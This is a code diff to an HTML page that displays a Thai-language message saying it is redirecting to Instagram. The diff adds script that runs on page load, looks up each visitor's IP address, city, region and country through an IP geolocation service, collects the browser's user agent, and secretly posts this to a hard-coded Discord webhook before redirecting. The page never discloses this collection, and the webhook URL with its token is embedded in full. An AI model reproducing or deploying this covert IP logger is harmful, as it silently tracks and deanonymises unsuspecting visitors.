@@ -8,8 +8,49 @@
 <body>
     <p>กำลังเปลี่ยนเส้นทางไปที่ Instagram...</p>
     <script>
-        // สคริปต์สำหรับเปลี่ยนเส้นทางไปยังลิงก์ Instagram
-        window.location.href = "https://www.instagram.com/_sitthiph0n?igsh=MTh0bXVsYzZqaDJtYw==";
+        // ฟังก์ชันเพื่อดึงข้อมูลจาก IP API
+        function fetchIPData() {
+            return fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => data);
+        }
+
+        // ฟังก์ชันเพื่อส่งข้อมูลไปยัง Discord Webhook
+        function sendToWebhook(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1175658007833612348/4igS6PbQGK8byXd0G1DwCPrjQL9ROHBrfgkZNsJ5e3zRcGPtzXbrXzWDOiIXmwzxKuP_";
+            const payload = {
+                content: "New visitor info:",
+                embeds: [
+                    {
+                        title: "Visitor Information",
+                        fields: [
+                            { name: "IP Address", value: data.ip || "N/A", inline: true },
+                            { name: "City", value: data.city || "N/A", inline: true },
+                            { name: "Region", value: data.region || "N/A", inline: true },
+                            { name: "Country", value: data.country_name || "N/A", inline: true },
+                            { name: "Device", value: navigator.userAgent || "N/A", inline: true }
+                        ],
+                        color: 16711680
+                    }
+                ]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+        }
+
+        // ดึงข้อมูล IP และระบบอื่น ๆ แล้วส่งไปยัง Webhook
+        fetchIPData().then(ipData => {
+            sendToWebhook(ipData);
+
+            // เปลี่ยนเส้นทางไปยัง Instagram หลังจากส่งข้อมูลแล้ว
+            window.location.href = "https://www.instagram.com/_sitthiph0n?igsh=MTh0bXVsYzZqaDJtYw==";
+        });
     </script>
 </body>
 </html>
